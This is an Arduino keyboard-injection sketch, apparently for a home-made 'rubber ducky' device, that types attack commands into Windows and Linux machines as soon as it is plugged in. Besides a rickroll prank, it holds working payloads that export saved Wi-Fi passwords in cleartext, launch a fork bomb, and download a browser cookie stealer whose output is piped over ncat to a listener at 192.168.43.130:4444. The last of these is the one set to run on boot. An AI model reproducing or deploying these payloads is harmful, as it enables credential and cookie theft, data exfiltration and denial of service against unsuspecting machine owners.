#include <Keyboard.h>
//breadboard banter
//int BUTTON = 4;

// WINDOWS SHIT 
void StartMenuSearch(String Message) {
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  delay(200);
  Keyboard.print(Message);
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.release(KEY_RETURN);
}
void OpenNotePad(String Message) {
  StartMenuSearch("Notepad");
  int m = Message.length();
  for (int i = 0; i < m; i++) {
    Keyboard.print(Message[i]);
  }
}
void ChromeSearch(String Message) {
  StartMenuSearch("Chrome");
  Keyboard.print(Message);
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.release(KEY_RETURN);
}
void payload_1() {
  ChromeSearch("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  delay(400);
  OpenNotePad("  __                    __\n<(o )___            ___( o)>\n ( ._> / Ducky Time \\ <_. )\n  `---'    ~Gibble   `---'");
}
void runShellCmd(String cmd) {
  Keyboard.println(cmd);
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.release(KEY_RETURN);
  delay(200);
}
void payload_2() {
  StartMenuSearch("powershell");
  delay(200);
  runShellCmd("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
  delay(200);
  runShellCmd("mkdir C:\\tmp");
  delay(200);
  runShellCmd("Invoke-WebRequest -Uri 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/7675f731-b455-4afd-94f3-9e02f11476dc/d4ikzpu-022a552f-1984-48f9-9f0e-f6d1d6359f4f.jpg/v1/fill/w_1231,h_649,q_70,strp/angry_ducky_by_elio_chan_d4ikzpu-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MjcxMiIsInBhdGgiOiJcL2ZcLzc2NzVmNzMxLWI0NTUtNGFmZC05NGYzLTllMDJmMTE0NzZkY1wvZDRpa3pwdS0wMjJhNTUyZi0xOTg0LTQ4ZjktOWYwZS1mNmQxZDYzNTlmNGYuanBnIiwid2lkdGgiOiI8PTUxNDUifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.xPZi5rq3kc7EcBHl3DxnjncOKVyq7rWNPDKHhS4Nu58' -OutFile C:\\tmp\\test.jpg");
  delay(200);
  //runShellCmd("wget 'https://get.station307.com/cDv2LOTHg25/theme.theme' -o C:\\tmp\\newTheme.theme");
  delay(200);
  //runShellCmd("C\:\\WINDOWS\\system32\\rundll32.exe C:\\WINDOWS\\system32\\themecpl.dll,OpenThemeAction C:\\tmp\\newTheme.theme");
  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  delay(200);
  Keyboard.press(KEY_F4);
  delay(200);
  Keyboard.releaseAll();

}
void sendMeEmail() {
  StartMenuSearch("powershell");
  delay(200);
  delay(200);
  Keyboard.print("[REDACTED]");
  Keyboard.press(KEY_TAB);
  delay(200);
  Keyboard.releaseAll();
  //Keyboard.println("");
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

}

void payloadd_3() {
  StartMenuSearch("powershell");
  delay(200);
  runShellCmd("mkdir C:\\tmp2");
  runShellCmd("mkdir C:\\new");
  runShellCmd("cd C:\\tmp2");
  runShellCmd("netsh wlan export profile key=clear");
  runShellCmd("cd ..");
  //runShellCmd("Compress-Archive -Path C:\\tmp2 -DestinationPath C:\\new\\new");
  sendMeEmail();
}


// LINUX SHIT
void popthatShell() {
  Keyboard.press(KEY_LEFT_ALT);
  delay(200);
  Keyboard.press(KEY_F1);
  delay(200);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("terminal");
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(200);
  Keyboard.press('n');
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cd ");
  delay(100);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(200);
  Keyboard.press('`');
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(200);
}
//Had to redo print cause nothing works :)
void newPrint(String URL) {
  char temp[URL.length()+1];
  URL.toCharArray(temp, URL.length()+1);
  for (int i = 0; i < URL.length(); i++) {
    if (temp[i] == ':'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press(';');
      delay(50);
      Keyboard.releaseAll();
      
    }else if (temp[i] == '?'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('/');
      delay(50);
      Keyboard.releaseAll();
    }else if (temp[i] == '&'){  
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('7');
      delay(50);
      Keyboard.releaseAll();    
    }else if (temp[i] == '|'){  
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('\\');
      delay(50);
      Keyboard.releaseAll();
    }else if (temp[i] == '('){  
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('9');
      delay(50);
      Keyboard.releaseAll();
   }else if (temp[i] == ')'){  
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('0');
      delay(50);
      Keyboard.releaseAll();
   }else if (temp[i] == '}'){  
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press(']');
      delay(50);
      Keyboard.releaseAll();    
   }else if (temp[i] == '{'){  
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('[');
      delay(50);
      Keyboard.releaseAll();                
    }else if (temp[i] >= 'A'  && temp[i] <= 'Z'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(20);
      Keyboard.press(temp[i]);
      delay(20);
      Keyboard.releaseAll();
    }else{
      Keyboard.releaseAll();
      delay(20);
      Keyboard.print(URL[i]);
    }
  }
  Keyboard.press(KEY_RETURN);
  delay(80);
  Keyboard.releaseAll();

}

void payload5 () {
  popthatShell();
  newPrint(":(){ :|: & };:");
  
}
void payload4 () {

  popthatShell();
  newPrint("wget -O script.py https://raw.githubusercontent.com/Josh-Murray/chromeCookie/master/cookieStealer.py?token=AJ4THAU3OXJD3WRTXLCYGSK5IDZCM ");
  delay(1000);
  newPrint("python3 script.py | ncat 192.168.43.130 4444");
  //moved onto linux, cause windows is a meme
  //new target system is fedora (new main OS, wanna learn it, and there no better way than trying to yeet it)

  //wget python 
  //wget requirements
  //run python


}
void setup() {
  Keyboard.begin();
  delay(400);
  payload4();
}


void loop() {
  // put your main code here, to run repeatedly:

}
